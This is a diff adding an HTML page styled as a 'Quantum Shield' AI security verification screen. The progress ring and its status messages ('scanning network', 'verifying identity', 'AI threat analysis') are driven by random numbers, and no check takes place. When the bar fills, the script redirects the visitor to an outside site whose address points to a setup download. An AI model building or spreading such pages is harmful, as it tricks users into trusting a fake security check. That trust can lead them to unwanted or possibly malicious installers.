@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔐 Quantum Shield • Verification</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+  font-family:'Poppins',sans-serif;
+  background:#020617;
+  color:#fff;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+}
+
+/* animated gradient mesh */
+body::before{
+  content:"";
+  position:absolute;
+  width:200%;
+  height:200%;
+  background:
+    radial-gradient(circle at 25% 25%, #0ea5ff33, transparent),
+    radial-gradient(circle at 75% 75%, #a855f733, transparent),
+    radial-gradient(circle at 50% 60%, #22c55e22, transparent);
+  animation:bg 10s infinite alternate ease-in-out;
+}
+@keyframes bg{
+  to{transform:translate(-5%,-5%) scale(1.1);}
+}
+
+/* card */
+.card{
+  width:420px;
+  padding:2.5rem;
+  text-align:center;
+  border-radius:25px;
+  background:rgba(15,23,42,0.75);
+  backdrop-filter:blur(20px);
+  border:1px solid rgba(255,255,255,0.08);
+  box-shadow:0 0 40px rgba(0,0,0,0.6),
+             0 0 30px rgba(99,102,241,0.25);
+  z-index:2;
+}
+
+/* title */
+h1{
+  font-size:1.9rem;
+  margin-bottom:0.5rem;
+  background:linear-gradient(90deg,#38bdf8,#818cf8,#22c55e);
+  -webkit-background-clip:text;
+  color:transparent;
+  animation:glow 5s linear infinite;
+}
+@keyframes glow{
+  to{background-position:200%;}
+}
+
+.subtitle{
+  font-size:0.85rem;
+  color:#94a3ff;
+  margin-bottom:2rem;
+}
+
+/* progress ring */
+.circle{
+  width:130px;
+  height:130px;
+  border-radius:50%;
+  margin:0 auto 2rem;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:conic-gradient(#3b82f6 0deg, #1e293b 0deg);
+  position:relative;
+}
+
+.circle::after{
+  content:"";
+  position:absolute;
+  width:95px;
+  height:95px;
+  background:#020617;
+  border-radius:50%;
+}
+
+/* percent */
+.percent{
+  position:relative;
+  font-size:2rem;
+  font-weight:700;
+  z-index:2;
+}
+
+/* text */
+.progress-text{
+  margin-bottom:1rem;
+  color:#e2e8f0;
+}
+
+/* status badge */
+.status{
+  display:inline-block;
+  padding:0.5rem 1.3rem;
+  border-radius:999px;
+  background:rgba(255,255,255,0.06);
+  border:1px solid rgba(255,255,255,0.1);
+  font-size:0.85rem;
+}
+
+/* floating emojis */
+.emoji{
+  position:absolute;
+  font-size:18px;
+  animation:float 8s linear infinite;
+  opacity:0.6;
+}
+@keyframes float{
+  from{transform:translateY(0);}
+  to{transform:translateY(-900px);}
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <h1>🔐 Quantum Shield</h1>
+  <div class="subtitle">AI-powered secure verification</div>
+
+  <div class="circle" id="circle">
+    <div class="percent" id="percent">0%</div>
+  </div>
+
+  <div class="progress-text">🔎 initializing secure scan...</div>
+  <div class="status" id="status">🛰️ connecting nodes</div>
+</div>
+
+<script>
+const percentEl = document.getElementById("percent");
+const statusEl = document.getElementById("status");
+const circle = document.getElementById("circle");
+
+let progress = 0;
+
+const steps = [
+  "🛰️ connecting nodes",
+  "🔍 scanning network",
+  "🔐 verifying identity",
+  "⚡ encrypting channel",
+  "🧠 AI threat analysis",
+  "🛡️ activating shield",
+  "✅ secured",
+  "🚀 redirecting..."
+];
+
+function update(){
+  progress += Math.random()*6;
+
+  if(progress >= 100){
+    progress = 100;
+    percentEl.textContent = "100%";
+    statusEl.textContent = "🚀 redirecting...";
+
+    setTimeout(()=>{
+      // ✅ YOUR LINK ADDED HERE
+      window.location.href = "https://lewdgamespc.com/setup-s/";
+    },1000);
+    return;
+  }
+
+  let deg = progress * 3.6;
+  circle.style.background = `conic-gradient(#3b82f6 ${deg}deg, #1e293b ${deg}deg)`;
+
+  percentEl.textContent = Math.floor(progress) + "%";
+
+  let index = Math.floor((progress/100)*steps.length);
+  statusEl.textContent = steps[index];
+
+  setTimeout(update, 150);
+}
+update();
+
+/* floating emojis */
+const emojis = ["🔐","⚡","🛡️","✨","🛰️","💠"];
+
+for(let i=0;i<40;i++){
+  let e = document.createElement("div");
+  e.className="emoji";
+  e.textContent = emojis[Math.floor(Math.random()*emojis.length)];
+  e.style.left = Math.random()*100+"%";
+  e.style.top = Math.random()*100+"%";
+  e.style.animationDuration = (5+Math.random()*5)+"s";
+  document.body.appendChild(e);
+}
+</script>
+
+</body>
+</html>
